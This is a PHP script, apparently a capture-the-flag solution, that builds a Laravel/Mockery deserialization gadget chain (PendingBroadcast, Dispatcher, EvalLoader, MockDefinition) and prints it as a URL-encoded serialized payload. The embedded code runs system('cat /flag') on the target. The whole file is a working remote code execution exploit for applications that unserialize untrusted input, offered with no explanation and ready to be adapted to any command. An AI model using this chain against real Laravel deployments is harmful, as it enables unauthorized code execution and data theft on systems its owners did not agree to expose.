<?php

namespace Illuminate\Broadcasting {

    use Illuminate\Bus\Dispatcher;
    use Illuminate\Foundation\Console\QueuedCommand;

    class PendingBroadcast
    {
        protected $events;
        protected $event;

        public function __construct()
        {
            $this->events = new Dispatcher();
            $this->event = new QueuedCommand();
        }
    }
}

namespace Illuminate\Foundation\Console {

    use Mockery\Generator\MockDefinition;

    class QueuedCommand
    {
        public $connection;

        public function __construct()
        {
            $this->connection = new MockDefinition();
        }
    }
}

namespace Illuminate\Bus {

    use Mockery\Loader\EvalLoader;

    class Dispatcher
    {
        protected $queueResolver;

        public function __construct()
        {
            $this->queueResolver = [new EvalLoader(), 'load'];
        }
    }
}

namespace Mockery\Loader {
    class EvalLoader
    {

    }
}

namespace Mockery\Generator {
    class MockConfiguration
    {
        protected $name = "feng";
    }

    class MockDefinition
    {
        protected $config;
        protected $code;

        public function __construct()
        {
            $this->code = "<?php system('cat /flag');exit()?>";
            $this->config = new MockConfiguration();
        }
    }
}

namespace {

    use Illuminate\Broadcasting\PendingBroadcast;

    echo urlencode(serialize(new PendingBroadcast()));
}